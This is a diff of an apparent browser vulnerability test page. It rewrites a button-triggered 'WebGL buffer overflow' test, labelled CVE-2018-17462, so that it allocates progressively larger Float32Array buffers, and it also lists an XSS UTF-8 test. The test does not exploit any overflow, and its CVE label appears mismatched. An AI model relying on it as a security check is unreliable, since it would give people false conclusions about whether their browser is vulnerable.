@@ -27,26 +27,30 @@
     </script>
 
     <!-- Test WebGL Buffer Overflow (CVE-2018-17462) avec WebGL 1.0/2.0 -->
-    <button onclick="testWebGLBufferOverflow()">Test WebGL Buffer Overflow</button>
-    <script>
-        function testWebGLBufferOverflow() {
-            try {
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl'); // WebGL 1.0 ou 2.0
-                if (gl) {
-                    var buffer = gl.createBuffer();
-                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                    var data = new Float32Array(10000000); // Buffer énorme
+<button onclick="testWebGLBufferOverflow()">Test WebGL Buffer Overflow</button>
+<script>
+    function testWebGLBufferOverflow() {
+        try {
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+            if (gl) {
+                var buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                var sizes = [5000000, 10000000, 20000000]; // Tailles variables
+                for (var size of sizes) {
+                    var data = new Float32Array(size);
                     gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
-                    alert('WebGL actif, overflow testé (crash si vulnérable)');
-                } else {
-                    alert('WebGL non pris en charge');
+                    alert(`Test avec ${size} éléments`);
                 }
-            } catch (e) {
-                alert('Erreur WebGL: ' + e.message);
+                alert('Tous les tests terminés (crash si vulnérable)');
+            } else {
+                alert('WebGL non pris en charge');
             }
+        } catch (e) {
+            alert('Erreur WebGL: ' + e.message);
         }
-    </script>
+    }
+</script>
 
     <!-- Test XSS via UTF-8 Encoding (CVE-2014-3167) -->
     <button onclick="testXSSUTF8()">Test XSS UTF-8</button>
